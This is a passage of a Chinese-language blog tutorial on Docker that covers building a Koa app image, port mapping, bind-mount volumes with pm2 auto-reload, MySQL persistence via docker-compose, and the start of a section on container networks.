data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1611892740700-2fe7fd1a-071c-4254-b56b-e84323495d22.png#height=81&id=fUsqz&originHeight=81&originWidth=363&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7090&status=done&style=none&title=&width=363" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"><br><a name="KLd4K"></a></p><h2 id="生成镜像"><a href="#生成镜像" class="headerlink" title="生成镜像"></a>生成镜像</h2><p>首先创建一个 dockerfile</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 基础镜像</span></span><br><span class="line"><span class="keyword">FROM</span> node:<span class="number">15.6</span>.<span class="number">0</span>-alpine3.<span class="number">10</span></span><br><span class="line"><span class="comment"># 添加当前文件到容器中的app</span></span><br><span class="line"><span class="keyword">ADD</span><span class="language-bash"> . /app/</span></span><br><span class="line"><span class="comment"># 设置工作目录为/app</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /app</span></span><br><span class="line"><span class="comment"># 安装包</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> npm i</span></span><br><span class="line"><span class="comment"># 开放当前3001接口</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">3001</span></span><br><span class="line"><span class="comment"># 默认启动命令</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;node&quot;</span>, <span class="string">&quot;app.js&quot;</span>]</span></span><br></pre></td></tr></table></figure><p>创建完成后 build 一下 <code>docker build -t xuan/hello .</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ...以上胜率</span></span><br><span class="line">Step 5/6 : EXPOSE 3001</span><br><span class="line"> ---&gt; Running <span class="keyword">in</span> 86dd3555883f</span><br><span class="line">Removing intermediate container 86dd3555883f</span><br><span class="line"> ---&gt; a9455b8dbf12</span><br><span class="line">Step 6/6 : CMD [<span class="string">&quot;node&quot;</span>, <span class="string">&quot;app.js&quot;</span>]</span><br><span class="line"> ---&gt; Running <span class="keyword">in</span> 41fd4f405d70</span><br><span class="line">Removing intermediate container 41fd4f405d70</span><br><span class="line"> ---&gt; c4f8645cf369</span><br><span class="line">Successfully built c4f8645cf369</span><br><span class="line">Successfully tagged xuan/hello:latest</span><br></pre></td></tr></table></figure><p>此时镜像已经打包成功，可以通过<code>docker images</code>查看，或者通过 desktop 查看<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1611893168646-92de999a-1a9d-4afc-b32c-81cdc27fc611.png#height=578&id=pqEYJ&originHeight=578&originWidth=2078&originalType=binary&ratio=1&rotation=0&showTitle=false&size=75987&status=done&style=none&title=&width=2078" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1611893168646-92de999a-1a9d-4afc-b32c-81cdc27fc611.png#height=578&id=pqEYJ&originHeight=578&originWidth=2078&originalType=binary&ratio=1&rotation=0&showTitle=false&size=75987&status=done&style=none&title=&width=2078" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p><a name="QTZB0"></a></p><h2 id="运行测试"><a href="#运行测试" class="headerlink" title="运行测试"></a>运行测试</h2><p>镜像生成成功后，来测试下是否生成成功，输入<code>docker run xuan/hello</code> ，此时控制台显示</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  koa2Docker docker run xuan/hello</span><br><span class="line">已启动3001</span><br></pre></td></tr></table></figure><p>使用浏览器打开 localhost:3001</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1611893655163-d2a0d54f-7490-4ed3-8f08-1844171ff76f.png#height=244&id=Rgp7v&originHeight=343&originWidth=726&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22912&status=done&style=none&title=&width=516" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1611893655163-d2a0d54f-7490-4ed3-8f08-1844171ff76f.png#height=244&id=Rgp7v&originHeight=343&originWidth=726&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22912&status=done&style=none&title=&width=516" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>并没有预期打开成功，而是显示无法访问，使用<code>docker ps -a</code>命令查看容器状况，发现容器本身是正常的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  hello docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE        COMMAND                  CREATED          STATUS          PORTS      NAMES</span><br><span class="line">66eb8ba8d1d1   xuan/hello   <span class="string">&quot;docker-entrypoint.s…&quot;</span>   14 seconds ago   Up 13 seconds   3001/tcp   vibrant_moser</span><br></pre></td></tr></table></figure><p>这是什么原因呢？<br />其实容器和本地机绑定需要依赖接口绑定才能进行访问的，<br />目前只开放了容器的 3001 接口，但是本地机是无法直接访问的，此时可以通过-p 参数来指定端口映射，修改一下启动命令为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 3001:3001 xuan/hello</span><br></pre></td></tr></table></figure><p>重新打开浏览器， 可以正常访问服务<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1611895240458-f1465438-9f11-4961-9d17-c8f7ff565a1a.png#height=87&id=nppou&originHeight=87&originWidth=320&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5385&status=done&style=none&title=&width=320" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1611895240458-f1465438-9f11-4961-9d17-c8f7ff565a1a.png#height=87&id=nppou&originHeight=87&originWidth=320&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5385&status=done&style=none&title=&width=320" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"><br />（注： 如果需要后台运行的话，可以加个 <code>-d</code> 命令）</p><p><a name="BqtYo"></a></p><h1 id="进阶：持久化存储"><a href="#进阶：持久化存储" class="headerlink" title="进阶：持久化存储"></a>进阶：持久化存储</h1><p><a name="EDi4k"></a></p><h2 id="为什么？"><a href="#为什么？" class="headerlink" title="为什么？"></a>为什么？</h2><p>因为 docker 的镜像本身是无状态的不会记录后续再容器中的任何操作，例如在 xuan&#x2F;hello 容器中修改中间件返回值，改为”edit”</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params">ctx, next</span>) =&gt;</span> &#123;</span><br><span class="line">  ctx.<span class="property">body</span> = <span class="string">&quot;edit&quot;</span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>重新进行 docker run，新的容器没有任何变化，也就是无法保留任何不存在 build 镜像后的任何数据，这里就遇到了一个问题？ <br />使用 mysql 容器的的话，怎么保存 docker 环境下的 mysql 数据表更新，毕竟 reload 容器会丢失全部 data，这明显不是一个可以接受的事情</p><p>这里就引出 docker 的 volume 功能</p><p><a name="XtRcc"></a></p><h2 id="Volume-的类型"><a href="#Volume-的类型" class="headerlink" title="Volume 的类型"></a>Volume 的类型</h2><p>volume 分为 2 种模式，Named Volumes， Bind Mounts，下面是区别：</p><table><thead><tr><th></th><th>Named Volumes</th><th>Bind Mounts</th></tr></thead><tbody><tr><td>Host Location</td><td>Docker chooses</td><td>You control</td></tr><tr><td>Mount Example (using <code>-v</code><br />)</td><td>my-volume:&#x2F;usr&#x2F;local&#x2F;data</td><td>&#x2F;path&#x2F;to&#x2F;data:&#x2F;usr&#x2F;local&#x2F;data</td></tr><tr><td>Populates new volume with container contents</td><td>Yes</td><td>No</td></tr><tr><td>Supports Volume Drivers</td><td>Yes</td><td>No</td></tr></tbody></table><p><a name="BdOtr"></a></p><h3 id="Named-Volumes"><a href="#Named-Volumes" class="headerlink" title="Named Volumes"></a>Named Volumes</h3><p>Named Volumes 是 docker 自己管理的 volume，通过 docker volumes create 创建</p><p><a name="BECrS"></a></p><h3 id="Bind-Mounts"><a href="#Bind-Mounts" class="headerlink" title="Bind Mounts"></a>Bind Mounts</h3><p>将宿主机与容器进行文件绑定映射，即不论在宿主机还是容器内进行文件修改，都会同步生效</p><p><a name="dat6w"></a></p><h2 id="怎么用？"><a href="#怎么用？" class="headerlink" title="怎么用？"></a>怎么用？</h2><p>这里分两种场景，一个是开发应用的时候需要宿主机和容器内的及时同步，另一个是 mysql 的数据同步，这里为了方便讲解我用的是 bind mounts 方式</p><p><a name="CTbvb"></a></p><h3 id="app-应用的更新"><a href="#app-应用的更新" class="headerlink" title="app 应用的更新"></a>app 应用的更新</h3><p>在上文更新中间件的情况下，发现如果在本地代码中进行修改，不会对容器有任何的影响，那么当有测试和开发的任务时，想要更新容器就只能够重复 打包镜像 -&gt; 运行容器这个动作，对开发有着比较大的阻碍</p><p>那么怎么利用 volume 进行本地代码和 docker 容器的联动呢？</p><p><a name="PHKg0"></a></p><h4 id="文件映射"><a href="#文件映射" class="headerlink" title="文件映射"></a>文件映射</h4><p>上面讲解过 bind mounts 是将本地文件和 docker 文件进行绑定，那么就来试一下，重新运行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 3001:3001 -v /Users/xuan/Desktop/hello/koa2Docker:/app xuan/hello</span><br></pre></td></tr></table></figure><p>修改中间件 ctx.body &#x3D; ‘edit’</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> koa = <span class="built_in">require</span>(<span class="string">&quot;koa&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title function_">koa</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params">ctx, next</span>) =&gt;</span> &#123;</span><br><span class="line">  ctx.<span class="property">body</span> = <span class="string">&quot;edit&quot;</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3001</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;.........3001&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>进入容器看下具体情况<code>docker exec -it dafe1b24c301 /bin/sh</code>，这里<code>dafe1b24c301</code>为容器 id，可以通过<code>docker ps -l </code>查看，进入容器后默认在<code>/app</code>文件夹下，查看 app.js 检查下状况</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 打开app.js</span></span><br><span class="line">vi app.js</span><br></pre></td></tr></table></figure><p>app.js 可以看到 app.js 内部器是修改成功的<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1611921182584-39987aa5-c107-4960-a9f3-442517ecfcfe.png#height=145&id=TXRDw&originHeight=145&originWidth=238&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7795&status=done&style=none&title=&width=238" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1611921182584-39987aa5-c107-4960-a9f3-442517ecfcfe.png#height=145&id=TXRDw&originHeight=145&originWidth=238&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7795&status=done&style=none&title=&width=238" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"><br><a name="qLkwD"></a></p><h4 id="服务更新"><a href="#服务更新" class="headerlink" title="服务更新"></a>服务更新</h4><p>刷新浏览器，发现没什么变化，这个其实是因为虽然修改了文件，但实际上服务没有重启，实际上平时写 nodejs 也是每次更新要手动重启下服务<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1611920582354-97be5080-544c-4e87-a558-23b971408769.png#height=87&id=eJsyh&originHeight=87&originWidth=320&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5385&status=done&style=none&title=&width=320" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1611920582354-97be5080-544c-4e87-a558-23b971408769.png#height=87&id=eJsyh&originHeight=87&originWidth=320&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5385&status=done&style=none&title=&width=320" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"><br />重启下容器 <code>docker restart dafe1b24c301</code>，刷新浏览器<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1611921434993-6e194ee1-454e-4391-a60d-54fef6ad8320.png#height=76&id=sVD7y&originHeight=76&originWidth=276&originalType=binary&ratio=1&rotation=0&showTitle=false&size=4265&status=done&style=none&title=&width=276" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1611921434993-6e194ee1-454e-4391-a60d-54fef6ad8320.png#height=76&id=sVD7y&originHeight=76&originWidth=276&originalType=binary&ratio=1&rotation=0&showTitle=false&size=4265&status=done&style=none&title=&width=276" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"><br />页面更新成功</p><p><a name="5Inzg"></a></p><h4 id="pm2-自动刷新"><a href="#pm2-自动刷新" class="headerlink" title="pm2 自动刷新"></a>pm2 自动刷新</h4><p>平时在开发的时候为了避免每次修改都要进行服务器重启操作，通常会使用 pm2 帮监听文件变化，一旦文件内容变动自动重启服务，帮助节约时间，这里同理</p><p>在 dockerfile 里添加 pm2 的全局安装，修改 cmd 命令，通过<code>pm2-runtime app.js --watch</code>进行启动</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> node:<span class="number">15.6</span>.<span class="number">0</span>-alpine3.<span class="number">10</span></span><br><span class="line"><span class="keyword">ADD</span><span class="language-bash"> . /app/</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /app</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> npm install pm2 -g</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> npm i</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">3001</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;pm2-runtime&quot;</span>, <span class="string">&quot;app.js&quot;</span>]</span></span><br></pre></td></tr></table></figure><p>重新打包一个镜像并运行，重新打开浏览器，修改 app.js 文件内 ctx.body &#x3D; ‘pm2 start’</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">docker build -t xuan/hello .</span><br><span class="line">docker run -p 3001:3001 -v /Users/xuan/Desktop/hello/koa2Docker:/app xuan/hello</span><br><span class="line"><span class="comment"># log</span></span><br><span class="line">2021-01-29T12:17:52: PM2 <span class="built_in">log</span>: Launching <span class="keyword">in</span> no daemon mode</span><br><span class="line">2021-01-29T12:17:52: PM2 <span class="built_in">log</span>: [Watch] Start watching app</span><br><span class="line">2021-01-29T12:17:52: PM2 <span class="built_in">log</span>: App [app:0] starting <span class="keyword">in</span> -fork mode-</span><br><span class="line">2021-01-29T12:17:52: PM2 <span class="built_in">log</span>: App [app:0] online</span><br><span class="line">已启动3001</span><br></pre></td></tr></table></figure><p><code>command + R</code> 刷新浏览器，发现内容已经修改<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1611923103974-4e8ce0cc-1df0-4895-96a0-598dca842be2.png#height=87&id=MBfR8&originHeight=87&originWidth=333&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5001&status=done&style=none&title=&width=333" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1611923103974-4e8ce0cc-1df0-4895-96a0-598dca842be2.png#height=87&id=MBfR8&originHeight=87&originWidth=333&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5001&status=done&style=none&title=&width=333" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"><br><a name="FiOlw"></a></p><h4 id="额外关注"><a href="#额外关注" class="headerlink" title="额外关注"></a>额外关注</h4><p>突发奇想一下，从创建 app 应用到最终通过端口号访问服务，其实是<strong>没有任何依赖于宿主机的开发环境</strong>的，也就是说，<strong>在本机上，只要有 docker 环境，就可以进行正常业务的开发</strong></p><p>这也是 docker 带来的便利之处<br><a name="rMYlu"></a></p><h3 id="mysql-持久存储案例"><a href="#mysql-持久存储案例" class="headerlink" title="mysql 持久存储案例"></a>mysql 持久存储案例</h3><p>docker 一般情况下推荐一个 container 只做一件事情，这样即使一个容器挂了也很容易回复和查找原因，所以通常会用单独的容器运行 mysql</p><p>这里也就会遇到前文所说的问题： <br />镜像是无状态的，重新启动 image 的时候数据库保存的信息不会保留，不符合持久存储的预期</p><p>所以需要将数据库的 data 在宿主机同时保存一份，这样重新启动的时候会将本地的库同步到新的容器之中</p><p><a name="1OILg"></a></p><h4 id="文件映射-1"><a href="#文件映射-1" class="headerlink" title="文件映射"></a>文件映射</h4><p>这里为了讲解方便直接用了 docker-compose 配置文件说明，这里不用太抠细节，后续会将 docker-compose，可以找到 volumes 一行  <code>./mysql-data:/var/lib/mysql</code>，<br />将当前目录下的 mysql-data 和容器里的&#x2F;var&#x2F;lib&#x2F;mysql 进行关联</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&quot;3.7&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">app:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">xuanlazy/koa:0.0.6</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">app</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">3001</span><span class="string">:3001</span></span><br><span class="line">    <span class="attr">working_dir:</span> <span class="string">/app</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./:/app</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">MYSQL_HOST:</span> <span class="string">mysql</span></span><br><span class="line">      <span class="attr">MYSQL_USER:</span> <span class="string">root</span></span><br><span class="line">      <span class="attr">MYSQL_PASSWORD:</span> <span class="number">123456</span></span><br><span class="line">      <span class="attr">MYSQL_DB:</span> <span class="string">test</span></span><br><span class="line">  <span class="attr">mysql:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">mysql:latest</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">sql</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">3307</span><span class="string">:3306</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./db:/var/lib/mysql</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">MYSQL_ROOT_PASSWORD:</span> <span class="number">123456</span></span><br><span class="line">      <span class="attr">MYSQL_DATABASE:</span> <span class="string">test</span></span><br></pre></td></tr></table></figure><p>启动服务后，发现当前目录下多了一个 db 文件夹，可以看到已经把当前 mysql 整库拖出来<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1611924465137-435929f3-20ee-4946-a89d-893cdbbe4e59.png#height=484&id=Mpn6z&originHeight=484&originWidth=365&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24982&status=done&style=none&title=&width=365" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1611924465137-435929f3-20ee-4946-a89d-893cdbbe4e59.png#height=484&id=Mpn6z&originHeight=484&originWidth=365&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24982&status=done&style=none&title=&width=365" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"><br><a name="hXsqG"></a></p><h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>在 mysql 里创建一个表，并且插入数据，下面是现成的的 sql：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 创建表</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> runoob_tbl (</span><br><span class="line">        runoob_id <span class="type">INT</span> UNSIGNED AUTO_INCREMENT,</span><br><span class="line">        runoob_title <span class="type">VARCHAR</span>(<span class="number">100</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">        runoob_author <span class="type">VARCHAR</span>(<span class="number">40</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">        submission_date <span class="type">DATE</span>,</span><br><span class="line">        <span class="keyword">PRIMARY</span> KEY ( runoob_id )</span><br><span class="line">)ENGINE<span class="operator">=</span>InnoDB <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8;</span><br><span class="line"></span><br><span class="line"># 插入数据</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> runoob_tbl</span><br><span class="line">    (runoob_title, runoob_author, submission_date)</span><br><span class="line">    <span class="keyword">VALUES</span></span><br><span class="line">    (&quot;学习Dcoker&quot;, &quot;test&quot;, NOW())</span><br><span class="line"></span><br><span class="line"># 查询<span class="keyword">sql</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> runoob_tbl;</span><br></pre></td></tr></table></figure><p>存储成功后，停掉服务，重启的时候可以试下注释掉 volumes，看下区别（这里操作比较复杂信息量也少就不具挂例子了）<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1612151638862-a7c6b418-dbbe-466c-9c3d-0fb4a088226c.png#height=48&id=D6DNg&originHeight=48&originWidth=304&originalType=binary&ratio=1&rotation=0&showTitle=false&size=4648&status=done&style=none&title=&width=304" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1612151638862-a7c6b418-dbbe-466c-9c3d-0fb4a088226c.png#height=48&id=D6DNg&originHeight=48&originWidth=304&originalType=binary&ratio=1&rotation=0&showTitle=false&size=4648&status=done&style=none&title=&width=304" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>其实答案应该也猜得到，有挂 volumes 的情况下之前存的数据可以再次查询到，注释掉的情况下相当于启用的是一个新数据库</p><p><a name="rdY0e"></a></p><h1 id="进阶：多容器组合联动"><a href="#进阶：多容器组合联动" class="headerlink" title="进阶：多容器组合联动"></a>进阶：多容器组合联动</h1><p><a name="wRn2L"></a></p><h2 id="为什么要多容器联动？"><a href="#为什么要多容器联动？" class="headerlink" title="为什么要多容器联动？"></a>为什么要多容器联动？</h2><p><a href="https://docs.docker.com/get-started/07_multi_container/">官方文档</a>有写：</p><ul><li>很有可能需要以与数据库不同的方式扩展 API 和前端</li><li>单独的容器可让您隔离版本和更新版本</li><li>虽然您可以在本地使用数据库的容器，但可能要在生产环境中使用数据库的托管服务。然后，您不想随应用程序一起提供数据库引擎</li><li>运行多个进程将需要一个进程管理器（容器仅启动一个进程），这增加了容器启动&#x2F;关闭的复杂性</li></ul><p>所以通常针对一个服务拆成多个容器，例如：koa + mysql + nginx 服务，通常会分成 koa，mysql，nginx 三个容器，那么 docker 作为容器是完全使用沙箱机制，相互之间不会有任何接口，那么怎么进行联动呢？</p><p><a name="3Qfy5"></a></p><h2 id="network"><a href="#network" class="headerlink" title="network"></a>network</h2><p>其实 docker 提供了 network 能力，当两个容器在同一个网络的情况下就可以进行通讯，<br />使用 <code>docker network ls</code> 查看当前网络状况，默认情况下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">NETWORK ID     NAME      DRIVER    SCOPE</span><br><span class="line">e6a4baa5f217   bridge    bridge    <span class="built_in">local</span></span><br><span class="line">66a3ddcbaa06   host      host      <span class="built_in">local</span></span><br><span class="line">5d3adcd8922e   none      null      <span class="built_in">local</span></span><br></pre></td></tr></table></figure><p>具体含义可以查询 <a href="https://docs.docker.com/network/">network 文档</a> ，<br />对于实际应用来说可以通过<code>docker network create test-app</code>新建一个新的网络</p><p>验证一下，分别用以下两条命令分别启动两台容器：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 一会进入的主机</span></span><br><span class="line">docker run -d</span><br><span class="line">--network test-app           <span class="comment"># 使用test-app 网络</span></span><br><span class="line">--network-alias start-1      <span class="comment"># 网络名start-1</span></span><br><span class="line">--name test-host             <span class="comment"># 容器名</span></span><br><span class="line">docker/getting-started</span><br><span class="line"></span><br><span class="line"><span class="comment"># 子服务</span></span><br><span class="line">docker run -d</span><br><span class="line">--network test-app</span><br><span class="line">--network-alias start-2</span><br><span class="line">--name test-child</span><br><span 